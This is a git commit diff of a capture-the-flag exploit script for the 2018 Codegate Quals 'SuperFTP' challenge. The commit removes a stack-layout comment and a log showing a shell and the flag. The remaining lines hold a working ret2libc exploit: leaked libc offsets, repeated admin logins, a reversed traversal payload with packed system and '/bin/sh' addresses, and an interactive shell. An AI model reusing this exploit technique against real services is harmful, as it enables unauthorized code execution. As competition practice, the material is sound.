ac3f52736a702b1e1bdc771d8fd465e092381f90
NakHyon Kim <mathboy7@naver.com>
2018-02-06 10:40:47 +0900

    Update SuperFTP.py

--- 2018 Codegate Quals/SuperFTP/SuperFTP.py
+++ 2018 Codegate Quals/SuperFTP/SuperFTP.py
@@ -42,20 +42,6 @@ binsh = libc_base + 0x15902b
 for i in range(0x2e):
 	login("admin", "P3ssw0rd") # login cnt=0x2f now!
 
-'''
-============ <= stack of main
-...
-login_cnt    <= copy payload.reverse() until ret, before canary.
-...
-============ <= stack of menu 8
-...
-ret
-...
-canary
-...
-============ <= stack of downloadURL
-'''
-
 payload = "aa/../../cccccccc" # reverse input
 payload += p32(binsh)[::-1]
 payload += "AAAA"
@@ -64,16 +50,3 @@ payload += p32(system)[::-1]
 download(payload)
 
 r.interactive()
-
-'''
-[*] Switching to interactive mode
-
-Download for URL:
-/cccccccc�X0+AAAA�FI@
-$ id
-uid=1000(ftp) gid=1000(ftp) groups=1000(ftp)
-$ 
-$ cat flag
-Sorry_ftp_1s_brok3n_T_T@
-$ 
-'''
